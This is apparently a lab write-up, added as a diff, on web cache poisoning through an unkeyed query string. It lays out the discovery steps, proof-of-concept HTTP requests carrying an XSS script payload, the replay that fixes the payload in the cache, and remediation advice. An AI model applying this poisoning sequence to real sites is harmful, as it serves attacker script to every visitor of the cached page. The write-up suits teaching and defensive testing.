@@ -1,0 +1,291 @@
+# Web Cache Poisoning via an Unkeyed Query String
+
+## Executive Summary
+
+A **Web Cache Poisoning** vulnerability was identified due to the application's failure to include the query string in the cache key while still reflecting query parameters in the generated HTML response. This behavior allowed an attacker to poison the shared cache with malicious content, causing subsequent visitors to receive a cached response containing attacker-controlled JavaScript.
+
+By injecting a Cross-Site Scripting (XSS) payload through an unkeyed query parameter, arbitrary JavaScript was executed in every victim's browser until the cache entry expired.
+
+---
+
+# Vulnerability Information
+
+| Field                   | Value                                                  |
+| ----------------------- | ------------------------------------------------------ |
+| Vulnerability           | Web Cache Poisoning                                    |
+| CWE                     | CWE-444 – Inconsistent Interpretation of HTTP Requests |
+| CAPEC                   | CAPEC-37 – Retrieve Embedded Sensitive Data            |
+| OWASP Top 10            | A03:2021 – Injection                                   |
+| Severity                | High                                                   |
+| Impact                  | Cross-Site Scripting via shared cache                  |
+| Authentication Required | No                                                     |
+
+---
+
+# Affected Component
+
+**Home page**
+
+```http
+GET /
+```
+
+---
+
+# Description
+
+The application uses an HTTP cache that **does not include arbitrary query parameters in the cache key**.
+
+Although the cache ignores these parameters when identifying cached objects, the backend application processes them and reflects them into the generated HTML.
+
+As a consequence:
+
+* Different requests generate different HTML.
+* The cache treats them as the same object.
+* Malicious content generated for one request is served to all subsequent users requesting the same resource.
+
+This discrepancy enables cache poisoning.
+
+---
+
+# Root Cause
+
+The cache key is incomplete.
+
+The caching layer ignores arbitrary query parameters, while the backend application reflects them into the response.
+
+This inconsistency allows attacker-controlled input to become part of a cached object.
+
+---
+
+# Discovery Process
+
+## 1. Identifying an Unkeyed Query String
+
+A request was sent with an arbitrary parameter:
+
+```http
+GET /?test=123 HTTP/2
+```
+
+The response contained:
+
+```http
+X-Cache: hit
+Age: 15
+```
+
+Despite changing the query string, the cache still returned a cached response, demonstrating that the parameter was **not part of the cache key**.
+
+---
+
+## 2. Cache Busting
+
+An `Origin` header was added to force the cache to generate a fresh response.
+
+```http
+Origin: https://attacker.com
+```
+
+This produced:
+
+```http
+X-Cache: miss
+```
+
+allowing observation of how the application generated the response before it entered the cache.
+
+---
+
+## 3. XSS Injection
+
+An arbitrary query parameter containing an XSS payload was supplied:
+
+```http
+GET /?evil='/><script>alert(1)</script>
+```
+
+The payload was reflected into the generated HTML.
+
+---
+
+## 4. Poisoning the Cache
+
+The malicious request was replayed until the cache stored the generated response.
+
+The response contained:
+
+```http
+X-Cache: hit
+```
+
+confirming that the poisoned object had been cached.
+
+---
+
+## 5. Verifying Cache Poisoning
+
+The cache-busting `Origin` header was removed while requesting the normal homepage.
+
+Despite omitting the malicious parameter, the cached page still contained the injected payload.
+
+Loading the homepage executed:
+
+```javascript
+alert(1)
+```
+
+confirming successful cache poisoning.
+
+---
+
+# Proof of Concept
+
+## Initial Request
+
+```http
+GET /?test=123 HTTP/2
+Host: vulnerable-site
+```
+
+---
+
+## Cache Bust Request
+
+```http
+GET /?test=123 HTTP/2
+Host: vulnerable-site
+Origin: https://attacker.com
+```
+
+---
+
+## Malicious Request
+
+```http
+GET /?evil='/><script>alert(1)</script>
+Host: vulnerable-site
+Origin: https://attacker.com
+```
+
+---
+
+## Poisoning Request
+
+```http
+GET /?evil='/><script>alert(1)</script>
+Host: vulnerable-site
+```
+
+Repeated until:
+
+```http
+X-Cache: hit
+```
+
+---
+
+## Victim Request
+
+```http
+GET /
+```
+
+Result:
+
+```javascript
+alert(1)
+```
+
+---
+
+# Impact
+
+An attacker can poison the shared cache with arbitrary HTML or JavaScript.
+
+Any user receiving the poisoned cache entry executes attacker-controlled JavaScript without interacting with malicious links or submitting any input.
+
+Potential consequences include:
+
+* Session hijacking
+* Cookie theft (where cookies are accessible)
+* Phishing
+* DOM manipulation
+* Account compromise
+* Malware delivery
+* Persistent client-side attacks until cache expiration
+
+---
+
+# Risk Assessment
+
+| Metric              | Value                               |
+| ------------------- | ----------------------------------- |
+| Attack Complexity   | Low                                 |
+| Privileges Required | None                                |
+| User Interaction    | Required (victim loads cached page) |
+| Scope               | Changed                             |
+| Confidentiality     | High                                |
+| Integrity           | High                                |
+| Availability        | Low                                 |
+
+**Overall Risk:** **High**
+
+---
+
+# Remediation
+
+## Immediate
+
+* Include the complete query string in the cache key.
+
+---
+
+## Application
+
+* Never reflect untrusted query parameters directly into HTML.
+* Apply context-aware output encoding.
+* Validate all reflected input.
+
+---
+
+## Cache Configuration
+
+* Ensure cache keys contain every input capable of modifying responses.
+* Disable caching for pages containing user-controlled content.
+* Separate cache entries based on all response-influencing inputs.
+
+---
+
+## Defense in Depth
+
+* Deploy a strict Content Security Policy (CSP).
+* Use Subresource Integrity (SRI) where applicable.
+* Continuously monitor cache behavior for poisoning attempts.
+
+---
+
+# Lessons Learned
+
+This lab demonstrates a common implementation flaw in caching systems:
+
+* The backend processes query parameters.
+* The cache ignores them.
+* Attackers exploit this inconsistency to store malicious responses for all users.
+
+Unlike traditional reflected XSS, this technique turns a one-time reflection into a **shared attack** by leveraging the caching layer.
+
+---
+
+# References
+
+* PortSwigger Web Security Academy – *Web Cache Poisoning via an Unkeyed Query String*
+* OWASP Web Cache Poisoning
+* CWE-444 – Inconsistent Interpretation of HTTP Requests
+* RFC 9111 – HTTP Caching
+
+---
+
+# Conclusion
+
+The application is vulnerable to **Web Cache Poisoning** because arbitrary query parameters influence the generated response without being incorporated into the cache key. An attacker can inject malicious JavaScript into the cached homepage, causing every subsequent visitor to execute attacker-controlled code until the cache entry expires. This significantly amplifies the impact of an otherwise reflected input issue and highlights the importance of ensuring cache keys account for all response-influencing inputs.
